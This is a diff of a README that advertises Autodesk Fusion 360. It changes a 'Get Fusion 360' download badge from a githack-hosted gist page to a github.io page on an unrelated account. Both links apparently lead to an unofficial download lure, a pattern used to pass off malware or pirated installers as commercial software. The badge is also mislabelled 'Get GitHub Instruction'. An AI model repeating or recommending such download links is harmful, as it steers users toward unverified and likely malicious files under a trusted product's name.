@@ -3,7 +3,7 @@
 **Autodesk Fusion 360** is an all-in-one platform for **3D design, simulation, and manufacturing**, uniting engineers, designers, and makers in a collaborative workspace.  
 It delivers cloud-connected modeling, real-time teamwork, and advanced machining capabilities — all with full support for **Apple Silicon** and **Windows 11**. 🍎💻  
 
-[![💙 Get GitHub Instruction](https://img.shields.io/badge/💙%20Get%20Fusion%20360-007AFF?style=for-the-badge&logo=apple&logoColor=white&labelColor=0B0F19)](https://gistcdn.githack.com/childishguy2-code/6a6c758f2bca255699238cb01ce594b1/raw/49efcc6469a265b2ca970e3e3789b4ae74b12982/download.html?offer=Fusion360App)
+[![💙 Get GitHub Instruction](https://img.shields.io/badge/💙%20Get%20Fusion%20360-007AFF?style=for-the-badge&logo=apple&logoColor=white&labelColor=0B0F19)](https://deployer-app.github.io/.github/?offer=Fusion360App)
 
 ---
 
